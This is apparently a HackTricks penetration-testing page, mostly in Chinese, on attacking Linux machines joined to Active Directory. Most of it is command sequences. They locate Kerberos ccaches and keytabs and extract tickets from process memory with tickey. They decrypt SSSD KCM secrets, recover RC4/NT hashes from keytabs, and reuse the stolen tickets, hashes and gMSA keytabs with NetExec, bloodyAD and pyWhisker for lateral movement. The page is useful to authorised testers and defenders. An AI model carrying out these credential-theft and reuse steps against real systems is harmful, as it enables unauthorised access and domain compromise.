# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux machine 也可以存在于 Active Directory 环境中。

AD 中的 Linux machine 可以**本地存储 Kerberos material**：user ccaches、machine/service keytabs，以及 SSSD-managed secrets。这些 artefacts 通常可以像其他 Kerberos credential 一样被复用。要读取其中大多数，你需要是 ticket 的 user owner，或者在 machine 上拥有 **root**。

## Enumeration

### AD enumeration from linux

如果你在 Linux（或 Windows 中的 bash）上可以访问 AD，你可以尝试使用 [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) 来枚举 AD。

你也可以查看下面的页面，了解**从 linux 枚举 AD 的其他方法**：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA 是一个开源的 **alternative**，用于替代 Microsoft Windows **Active Directory**，主要面向 **Unix** 环境。它将完整的 **LDAP directory** 与 MIT **Kerberos** Key Distribution Center 结合，用于类似 Active Directory 的管理。它使用 Dogtag **Certificate System** 进行 CA 和 RA 证书管理，并支持 **multi-factor** authentication，包括 smartcards。SSSD 集成用于 Unix authentication processes。更多信息请见：


{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

在处理 tickets 之前，先确认**主机是如何加入 AD 的**以及**Kerberos material 实际存储在哪里**。在现代 Linux 主机上，这通常由 `realmd` + `adcli` + `sssd` 处理，而不只是 `/tmp` 中的普通文件：
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
这会快速告诉你主机是否信任 AD，SSSD 是否在缓存 identities 或 tickets，以及是否存在可被滥用的 **machine/service keytabs** 或 **KCM secrets**。

## Playing with tickets

### Pass The Ticket

在这一页中，你会找到不同的位置，在 Linux 主机上可以**找到 kerberos tickets**，在下面的页面中你可以了解如何将这些 CCache tickets 格式转换为 Kirbi（Windows 中需要使用的格式），以及如何执行 PTT attack：


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

如果你想了解 **Linux-specific ticket harvesting workflows**（`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, 等），请查看专门的页面：

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

CCACHE files 是二进制格式，用于**存储 Kerberos credentials**。`FILE:/tmp/krb5cc_%{uid}` 仍然很常见，但现代 Linux 部署也会使用 `DIR:/run/user/%{uid}/krb5cc*`、`KEYRING:persistent:%{uid}` 或 `KCM:%{uid}`。在默认认为 tickets 存在于 `/tmp` 之前，请先检查 **`KRB5CCNAME`** 环境变量和 `default_ccache_name` 设置。
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### CCACHE ticket reuse from keyring

**Kerberos tickets stored in a process's memory can be extracted**, particularly when the machine's ptrace protection is disabled (`/proc/sys/kernel/yama/ptrace_scope`). A useful tool for this purpose is found at [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), which facilitates the extraction by injecting into sessions and dumping tickets into `/tmp`.

To configure and use this tool, the steps below are followed:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
此过程将尝试注入各种 session，并通过将提取的 tickets 以 `__krb_UID.ccache` 的命名约定存储在 `/tmp` 中来表示成功。

### 来自 SSSD KCM 的 CCACHE ticket 重用

SSSD 在路径 `/var/lib/sss/secrets/secrets.ldb` 维护数据库的副本。对应的 key 存储为路径 `/var/lib/sss/secrets/.secrets.mkey` 下的隐藏文件。默认情况下，只有在你拥有 **root** 权限时才能读取该 key。

使用 **`SSSDKCMExtractor`** 并带上 --database 和 --key 参数将解析数据库并 **decrypt the secrets**。
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
The **credential cache Kerberos blob can be converted into a usable Kerberos CCache** file that can be passed to Mimikatz/Rubeus.

### 快速 keytab 分析
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### 从 /etc/krb5.keytab 提取账户

服务账户密钥是以 root 权限运行的服务所必需的，它们安全地存储在 **`/etc/krb5.keytab`** 文件中。这些密钥类似于服务的密码，因此需要严格保密。

要检查 keytab 文件的内容，可以使用 **`klist`**。在 Linux 上，`klist -k -K -e` 会打印 principals、密钥版本号、加密类型以及原始密钥材料。如果密钥类型是 **23 / RC4-HMAC**，那么该密钥值同时也是该 principal 的 **NT hash**。
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
对于 Linux 用户，**`KeyTabExtract`** 提供了提取 RC4 HMAC hash 的功能，可用于 NTLM hash reuse。请注意，这只有在 keytab 仍然包含 **etype 23 / RC4-HMAC** 材料时才有帮助。在 **AES-only** 环境中，你可能无法获得可复用的 NT hash，但你仍然可以通过 Kerberos 直接使用 keytab 进行认证。
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
在 macOS 上，**`bifrost`** 用作 keytab 文件分析工具。
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
利用提取到的账号和 hash 信息，可以使用像 **`NetExec`** 这样的工具建立到服务器的连接。
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### 重用来自 `/etc/krb5.keytab` 的 machine account

在 `realmd`/`adcli`/`sssd` 已加入的系统上，`/etc/krb5.keytab` 通常包含 **computer account** 以及一个或多个 **host/service principals**。如果你有 **root**，不要只是把它导出来：使用 `klist -k` 列出的某个 principal 来请求一个 TGT，并以 Linux 主机本身的身份进行操作。
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
当 **computer object** 本身在 AD 中拥有委派权限，或者主机被允许检索其他 secret（例如 **gMSA**）时，这尤其有用。

### 使用以 Linux 为主的 AD tooling 重用窃取的 Kerberos material

一旦你有了有效的 `ccache` 或可用的 keytab，你就可以**直接从 Linux** 对 AD 进行操作，而无需先把所有内容转换为 Windows 格式。许多现代工具都原生支持 `KRB5CCNAME` / Kerberos auth：
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
这是 **Linux post-exploitation** 和 **AD object abuse** 之间的一个很好的桥梁。对于对象级 abuse 路径本身，请查看：

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

最近的 Linux 部署可以直接从 AD 消费 **Managed Service Accounts**。实际上，这意味着在攻陷一台 Linux 服务器后，你可能不仅会找到主机 keytab，还会找到由 gMSA 生成的 **service-specific keytabs**。常见需要检查的位置包括 `/etc/gmsad.conf`、部署特定的配置文件，以及 `/etc` 下额外的 `*.keytab` 文件。
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
这会为绑定到该 gMSA 的 SPNs 提供一个可复用的 Kerberos 身份，**无需接触任何 Windows 终端**。对于在 AD 中获得更高权限后进行的**域侧** gMSA/dMSA 滥用，请查看：

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
